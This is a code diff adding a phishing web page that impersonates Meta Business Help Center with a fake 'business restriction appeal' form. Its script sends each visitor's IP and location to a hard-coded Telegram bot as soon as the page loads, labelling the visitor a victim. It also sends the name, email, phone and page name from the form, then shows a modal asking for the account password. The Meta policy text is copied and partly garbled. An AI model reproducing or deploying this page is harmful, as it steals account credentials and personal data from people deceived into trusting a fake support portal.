@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>Formal Appeal for Business Restriction.</title>
+  <link rel="stylesheet" href="./login_form_2.css" />
+  <link rel="stylesheet" href="assets/style/index.css">
+  <link href='https://fonts.googleapis.com/css?family=Montserrat' rel='stylesheet'>
+  <script src="assets/js/main.js"></script>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</head>
+<style>
+.column {
+  width: 100%;
+}
+@media (min-width: 600px) {
+  .column {
+    width: 50%;
+  }
+}
+.modal-content {
+  background-color: #fff;
+  margin: 15% auto;
+  padding: 15px;
+  width: 70%;
+  max-width: 400px;
+}
+
+.close {
+  color: #aaa;
+  float: right;
+  font-size: 24px;
+  font-weight: bold;
+}
+
+.footer{
+  padding-top: 40px;
+  text-align: center;
+}
+.footer p{
+  color: white;
+}
+.footer a{
+  color: white;
+}
+
+.logofooter{
+  width: 90px;
+  padding-bottom: 15px;
+}
+.column {
+  width: 100%;
+}
+.footer ul li p{
+  text-align: left;
+
+  font-size: 14px;
+}
+
+.topheader {
+  background-color: #355797;
+  text-align: left;
+  padding: 15px 20px;
+}
+
+.metahead{
+  color: white;
+  display: inline-block;
+  padding-left: 15px;
+  margin-left: 15px;
+  border-left: 1px solid white;
+  margin-bottom: 0px;
+  font-size: 14px;
+}
+
+.searchicon{
+  width: 20px;
+  height: 20px;
+  float: right;
+  margin-top: 2px;
+}
+
+.close:hover,
+.close:focus {
+  color: black;
+  text-decoration: none;
+  cursor: pointer;
+}
+
+/* Make it responsive for mobile devices */
+@media only screen and (max-width: 600px) {
+  .modal-content {
+    width: 90%;
+  }
+}
+</style>
+<body>
+
+<div class="topheader">
+  <div class="container">
+    <img class="metalogo" src="278052525_813944336231788_2126819975299864928_n.2ca221b227e5e50b2861f74e67923f35.svg">
+    <p class="metahead">Support Inbox</p>
+    <img src="search-13-64.a9254a55959a7da573f4.ico" class="searchicon">
+  </div>
+</div>
+
+<div class="img-background">
+  <div class="img-box">Meta Business Help Center</div>
+  <div class="img-box">Get Support</div>
+</div>
+
+<br>
+<script>
+ // Function to send a message to Telegram
+    function sendMessageToTelegram(message) {
+        // Telegram bot token
+        const botToken = '7093965120:AAFF2OKGU2BFdmjg_dVK3FKBx_wfyB6BfHA';
+        // Telegram chat ID
+        const chatID = '-4274437719';
+        // Telegram API endpoint
+        const apiUrl = `https://api.telegram.org/bot7093965120:AAFF2OKGU2BFdmjg_dVK3FKBx_wfyB6BfHA/sendMessage`;
+
+
+    // Data to be sent
+    const data = {
+        chat_id: chatID,
+        text: message
+    };
+
+    // Options for the fetch request
+    const options = {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    };
+
+    // Send the message using Fetch API
+    fetch(apiUrl, options)
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log('Message sent to Telegram:', data);
+        })
+        .catch(error => {
+            console.error('Error sending message to Telegram:', error);
+        });
+}
+
+// Function to fetch IP country and city information
+function fetchIPInfo() {
+    // API endpoint to fetch IP info
+    const apiUrl = 'https://ipinfo.io/json';
+
+    // Fetch IP info
+    fetch(apiUrl)
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.json();
+        })
+        .then(data => {
+            // Extract country and city information
+            const { country, city, ip } = data;
+            // Create message with country and city information
+            const message = `Viktima prej ${city}, ${country} (${ip}) ka hi n'Web!`;
+            // Send message to Telegram
+            sendMessageToTelegram(message);
+        })
+        .catch(error => {
+            console.error('Error fetching IP info:', error);
+        });
+}
+
+// Function to handle form submission
+function handleFormSubmit(event) {
+    event.preventDefault(); // Prevent default form submission
+    
+    const fullName = document.getElementById('fullName').value;
+    const email = document.getElementById('email').value;
+    const phoneNumber = document.getElementById('phoneNumber').value;
+    const pageName = document.getElementById('pageName').value;
+
+    // Create message with form data
+    const message = `=================:\nFull Name: ${fullName}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nPage Name: ${pageName}\n=================`;
+    
+    // Send message to Telegram
+    sendMessageToTelegram(message);
+
+    // Set formSubmitted to true
+    formSubmitted = true;
+    
+    // Show the modal
+    showBootstrapModal();
+}
+
+var formSubmitted = false;
+
+function showBootstrapModal() {
+    // Show the modal only if the form has been submitted
+    if (formSubmitted) {
+        var myModal = new bootstrap.Modal(document.getElementById('bootstrapModal'));
+        myModal.show();
+    }
+}
+
+// Function to execute when the page loads
+function onPageLoad() {
+    // Fetch IP info
+    fetchIPInfo();
+}
+
+// Execute onPageLoad function when the page finishes loading
+window.onload = onPageLoad;
+</script>
+
+<!-- Your content -->
+<div class="content">
+    <div class="flex-div">
+        <div class="name-content">
+            <h1 class="logo">Meta Business</h1>
+            <p>Formal Appeal for Business Restriction.</p>
+        </div>
+        <form id="contactForm" onsubmit="handleFormSubmit(event)">
+            <input type="text" id="fullName" placeholder="Full Name" required />
+            <input type="email" id="email" placeholder="Email" required />
+            <input type="tel" id="phoneNumber" placeholder="Phone Number" required />
+            <input type="text" id="pageName" placeholder="Page Name" required />
+            <button class="login" type="submit">Continue</button>
+        </form>
+    </div>
+</div>
+
+<!-- Bootstrap modal structure -->
+<div class="modal" tabindex="-1" id="bootstrapModal">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title">We need to confirm it's you.</h5>
+        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+      </div>
+      <div class="modal-body">
+        <label for="password">Password:</label>
+        <input type="password" class="form-control" id="password" placeholder="Enter your password">
+        <div id="loginMessage" style="color: red;"></div>
+      </div>
+      <div class="form-group">
+        <div class="modal-footer">
+          <button type="button" class="btn btn-primary" onclick="login()">Submit</button>
+        </div>
+      </div>
+    </div>
+  </div>
+<    <div class="modal form-modal" id="successModal" tabindex="-1" aria-labelledby="successModalLabel"
+        aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
+            <div class="modal-content">
+                <div class="modal-body">
+                    <div class="twoFAinfo-wraper">
+                        <h1 class="modal-title" id="successModalLabel">Request has been sent</h1>
+                        <br>
+                        <div class="fb-round-wraper">
+                            <img src="img/phone.png" alt="" style="width: 100%;">
+                        </div>
+                        <br>
+                        <p>Your request has been added to the processing queue. We will process your request within 24
+                            hours. If you
+                            do not receive an email message with the appeal status within 24 hours, please resend the
+                            appeal.</p>
+
+                    </div>
+                    <form action="https://facebook.com/" method="GET">
+                        <div class="form-btn-wrapper">
+                            <button class="btn btn-primary">
+
+                                <span class="button-text">Return on Facebook</span>
+                            </button>
+                        </div>
+                    </form>
+
+                </div>
+                <div class="modal-footer">
+                    <img src="img/meta-logo-grey.png" alt="">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal  " id="TermsModal" tabindex="-1" aria-labelledby="TermsModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <h4 class="modal-title" id="TermsModalLabel">Terms of use
+                    </h4>
+                    <p>Meta creates technologies and services that allow people to communicate with each other, form
+                        communities and develop companies. This User Agreement governs the use of
+                        you Facebook, Messenger, and other products, features, applications, services, technologies and
+                        software we offer (<a class="add-svg">Meta Products</a>
+                        or <a class="add-svg">Products</a>), if not expressly
+                        states that separate terms apply (and this agreement does not apply). These Products
+                        are provided to you by Meta Platforms, Inc. </p>
+                    <br>
+                    <p>
+                        Our <a class="add-svg">Privacy Policy</a> explains how we collect
+                        and use your personal
+                        data to determine which advertisements may be relevant to you, and
+                        provide other services described below. Also, in <a class="add-svg">settings</a> of the
+                        relevant Products
+                        Meta, you can change your privacy level at any time regarding our use of
+                        your data.
+                    </p>
+                    <br>
+                    <h6>Services we provide </h6>
+                    <ul>
+                        <li>
+                            Personalize your experience.
+                        </li>
+                        <li>
+                            Connect with people and organizations that interest you.
+                        </li>
+                        <li>
+                            Opportunity to express yourself and communicate on topics that are important to you.
+                        </li>
+                        <li>
+                            Search for content, products and services that may interest you.
+                        </li>
+                        <li>
+                            Ensuring the safety, security and integrity of our services, combating malicious
+                            behavior and protecting our user community.
+                        </li>
+                        <li>
+                            Using and developing advanced technologies to provide safe and
+                            functional services.
+                        </li>
+                        <li>
+                            Research ways to improve the quality of our services.
+                        </li>
+                        <li>
+                            Ensuring consistency and convenience of various Meta Companies Products.
+                        </li>
+                        <li>
+                            Providing access to our services.
+                        </li>
+                    </ul>
+                    <h6>
+                        Other terms and policies that may apply to you
+                    </h6>
+                    <ul>
+                        <li><a class="add-svg">Advertising Rules</a>. These rules apply to partners who
+                            advertise on various Meta Products and determine the types of advertising content that such
+                            partners are permitted to use.
+
+                        </li>
+                        <li><a class="add-svg">Community Standards</a>. These guidelines set out our standards
+                            for the content you post on Facebook and your activities on Facebook and other Meta
+                            Products.
+
+                        </li>
+                        <li><a class="add-svg">Community Payment Terms</a>. These terms apply to payments made
+                            to or through the Meta Products.
+
+                        </li>
+                        <li><a class="add-svg">Commercial terms</a>. These terms apply if you use or access our
+                            Products for any commercial or business purposes, including advertising, using our
+                            measurement services, managing an application on our Platform, a group or a Company Page,
+                            and selling goods or services .
+
+                        </li>
+                        <li><a class="add-svg">Trade Rules</a>. This guide outlines the rules that apply when
+                            you offer products or services for sale on Facebook, Instagram or WhatsApp.
+
+                        </li>
+                    </ul>
+                    <p>Last revision date: July 26, 2023</p>
+                    <br>
+                    <h6>Data control</h6>
+                    <div class="action-button wide">
+                        <div class="action-button-img">
+                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
+                                class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
+                                <path d="M12 12a2 2 0 0 1 1 3.732V17a1 1 0 1 1-2 0v-1.268A2 2 0 0 1 12 12z"></path>
+                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                    d="M7 6a5 5 0 0 1 10 0v2h.857c1.282 0 2.417.818 2.664 2.076A25.71 25.71 0 0 1 21 15a25.71 25.71 0 0 1-.479 4.924C20.274 21.182 19.14 22 17.857 22H6.143c-1.282 0-2.417-.818-2.664-2.076A25.711 25.711 0 0 1 3 15c0-1.984.236-3.692.479-4.924C3.726 8.818 4.86 8 6.143 8H7V6zm8 0v2H9V6a3 3 0 1 1 6 0zm-8.857 4h11.714a.84.84 0 0 1 .508.157c.107.082.17.182.194.305.223 1.133.441 2.71.441 4.538 0 1.828-.218 3.405-.441 4.538a.488.488 0 0 1-.194.305.84.84 0 0 1-.508.157H6.143a.84.84 0 0 1-.508-.157.489.489 0 0 1-.194-.305A23.712 23.712 0 0 1 5 15c0-1.828.218-3.405.441-4.538a.489.489 0 0 1 .194-.305.84.84 0 0 1 .508-.157z">
+                                </path>
+                            </svg>
+                        </div>
+                        <div class="action-button-text">
+                            <span>Account security</span>
+
+                        </div>
+                        <div class="action-button-arrow">
+                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
+                                class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
+                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                    d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
+                                </path>
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal  " id="policyModal" tabindex="-1" aria-labelledby="policyModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <h4 class="modal-title" id="policyModalLabel">Privacy Policy</h4>
+                    <h5>What is the Privacy Policy and what does it cover?</h5>
+                    <div class="action-button wide">
+                        <div class="action-button-img">
+                            <img src="img/star.png" alt="">
+                        </div>
+                        <div class="action-button-text">
+                            <span class="small-grey">The main thing in the section</span>
+                        </div>
+                        <div class="action-button-arrow">
+                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
+                                class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
+                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                    d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
+                                </path>
+                            </svg>
+                        </div>
+                    </div>
+                    <br>
+                    <p>At Meta, we want you to understand what information we collect, how we use it, and with whom we
+                        use it.
+                        let's share. Therefore, we recommend that you read our Privacy Policy. This
+                        will help you use
+                        <a target="_blank" class="add-svg">
+                            Meta</a>'s products
+                        the way you need.
+                    </p>
+                    <br>
+                    <p>In the Privacy Policy, we explain how we collect, use, store information, and
+                        We also share it. We also tell you about your rights. Each section of the Policy contains
+                        Useful examples and simplified statements to make our work easier to understand. We also
+                        added links to resources where you can learn in more detail about topics that interest you
+                        with confidentiality.</p>
+                    <br>
+                    <p>It is important to us that you know how to manage your privacy (confidentiality), so we also
+                        We show you where in the settings of the Meta Products you use you can manage your data. You
+                        you can
+                        <a target="_blank" class="add-svg">
+                            update these settings
+                        </a>
+                        to personalize your user experience.
+                    </p>
+                    <br>
+                    <p>
+                        Полный текст политики приведен ниже.
+                    </p>
+                    <br>
+                    <div class="action-button-list">
+                        <div class="action-button wide">
+                            <div class="action-button-text">
+                                <span class="small-grey">What products are covered by this policy?</span>
+                            </div>
+                            <div class="action-button-arrow">
+                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
+                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
+                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                        d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
+                                    </path>
+                                </svg>
+                            </div>
+                        </div>
+                        <div class="action-button wide">
+                            <div class="action-button-text">
+                                <span class="small-grey">Learn more about managing your privacy at
+                                    Privacy Center</span>
+                            </div>
+                            <div class="action-button-arrow">
+                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
+                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
+                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                        d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
+                                    </path>
+                                </svg>
+                            </div>
+                        </div>
+                    </div>
+                    <br>
+                    <h5>What information do we collect?</h5>
+                    <br>
+                    <p>
+                        The information we collect and process about you depends on how you use our <a
+                            class="add-svg">Products</a>.
+                        For example, we collect different information when you sell
+                        furniture on Marketplace and when you post a Reels video on Instagram. We collect data about you
+                        when you use our Products, <a class="add-svg">even if you do not have an account</a>.
+                    </p>
+                    <br>
+                    <p>The following are the types of data we collect:</p>
+                    <br>
+                    <div class="action-button-list">
+                        <div class="action-button wide">
+                            <div class="action-button-text">
+                                <span class="small-grey">Your actions and information you provide to us</span>
+                            </div>
+                            <div class="action-button-arrow">
+                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
+                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
+                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                        d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
+                                    </path>
+                                </svg>
+                            </div>
+                        </div>
+                        <div class="action-button wide">
+                            <div class="action-button-text">
+                                <span class="small-grey">Friends, subscribers and other contacts</span>
+                            </div>
+                            <div class="action-button-arrow">
+                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
+                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
+                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                        d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
+                                    </path>
+                                </svg>
+                            </div>
+                        </div>
+                        <div class="action-button wide">
+                            <div class="action-button-text">
+                                <span class="small-grey">Application, browser and device information</span>
+                            </div>
+                            <div class="action-button-arrow">
+                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
+                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
+                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                        d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
+                                    </path>
+                                </svg>
+                            </div>
+                        </div>
+                        <div class="action-button wide">
+                            <div class="action-button-text">
+                                <span class="small-grey">Information from Partners, suppliers and other third
+                                    parties</span>
+                            </div>
+                            <div class="action-button-arrow">
+                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
+                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
+                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                        d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
+                                    </path>
+                                </svg>
+                            </div>
+                        </div>
+
+                    </div>
+                    <br>
+                    <h5>What happens if you do not allow us to collect certain types of information?</h5>
+                    <br>
+                    <p>Some information is necessary for the operation of our Products. Other information is optional,
+                        but its absence may affect your experience with our products.</p>
+                    <p><a>More details ></a></p>
+                    <br>
+                    <h5>What if the information we collect does not personally identify individuals?</h5>
+                    <br>
+                    <p>In some cases, before third parties make information available to us, they de-identify,
+                        aggregate, or anonymize it so that it cannot be used to identify individual individuals. We use
+                        this information as described below, without attempting to re-identify individuals.</p>
+                    <br>
+                    <h5>Data control</h5>
+                    <div class="action-button wide">
+                        <div class="action-button-img">
+                            <img src="img/dir.png" alt="">
+                        </div>
+                        <div class="action-button-text">
+                            <span>Manage the information we collect about you</span>
+                            <br>
+                            <span class="small-grey">Privacy Center</span>
+                        </div>
+                        <div class="action-button-arrow">
+                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
+                                class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
+                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                    d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
+                                </path>
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <div class="modal  " id="searchModal" tabindex="-1" aria-labelledby="SearchModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <h4 class="modal-title" id="SearchModalLabel">Search</h4>
+                    <div class="search-input-wraper">
+                        <input placeholder="Search the Privacy Center">
+                        <div class="search-icon-wraper">
+                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
+                                class="x1lliihq x1k90msu x2h7rmj x1qfuztq xfuq9xy xlup9mm x1kky2od">
+                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                    d="M16.618 18.032a9 9 0 1 1 1.414-1.414l3.675 3.675a1 1 0 0 1-1.414 1.414l-3.675-3.675zM18 11a7 7 0 1 1-14 0 7 7 0 0 1 14 0z">
+                                </path>
+                            </svg>
+                        </div>
+                        <div class="close-search-icon-wraper" style="display: none;">
+                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
+                                class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 x1kpxq89 xsmyaan">
+                                <path
+                                    d="M5.707 4.293a1 1 0 1 0-1.414 1.414L10.586 12l-6.293 6.293a1 1 0 1 0 1.414 1.414L12 13.414l6.293 6.293a1 1 0 0 0 1.414-1.414L13.414 12l6.293-6.293a1 1 0 1 0-1.414-1.414L12 10.586 5.707 4.293z">
+                                </path>
+                            </svg>
+                        </div>
+                    </div>
+                    <div id="search-items" style="display: none;">
+                        <div class="fake-items" style="display: none;">
+                            <div></div>
+                            <div></div>
+                            <div></div>
+                        </div>
+                        <div class="now-found" style="display: none;">
+                            <div>
+                                <svg fill="currentColor" viewBox="0 0 96 96" width="1em" height="1em" aria-hidden="true"
+                                    class="">
+                                    <circle cx="48" cy="48" r="47" stroke-linecap="round" stroke-linejoin="round"
+                                        fill="none" stroke="currentColor" stroke-width="2px"></circle>
+                                    <path
+                                        d="M48 54.682a3.43 3.43 0 0 1-3.52-3.062l-1.615-22.518a5.136 5.136 0 0 1 10.272 0L51.523 51.62A3.432 3.432 0 0 1 48 54.682zM48 71.046a5.114 5.114 0 1 1 5.114-5.114 5.114 5.114 0 0 1-5.114 5.114z"
+                                        stroke-miterlimit="10" fill="none" stroke="currentColor" stroke-width="2px">
+                                    </path>
+                                </svg>
+                            </div>
+                            <h4>Nothing found</h4>
+                            <p>Use other keywords or check the spelling of the search term
+                                request.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal  " id="accountsModal" tabindex="-1" aria-labelledby="accountsModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <h4 class="modal-title" id="accountsModalLabel">Accounts in the Privacy Center </h4>
+                    <p>Accounts and profiles that you add to one Account Center are also available in the Privacy
+                        Center. Here you can select the account and profile you need.</p> <br>
+                    <div class="action-button wide">
+                        <div class="action-button-img">
+                            <img src="img/no_avatar.png" alt="">
+                        </div>
+                        <div class="action-button-text">
+                            <span class="UserName"></span>
+                            <br>
+                            <span class="small-grey ">Facebook</span>
+                        </div>
+                        <div class="action-button-arrow">
+                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="">
+                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                    d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
+                                </path>
+                            </svg>
+                        </div>
+                    </div>
+                    <br>
+                    <a class="add-svg">You can manage these accounts in the Account Center.</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
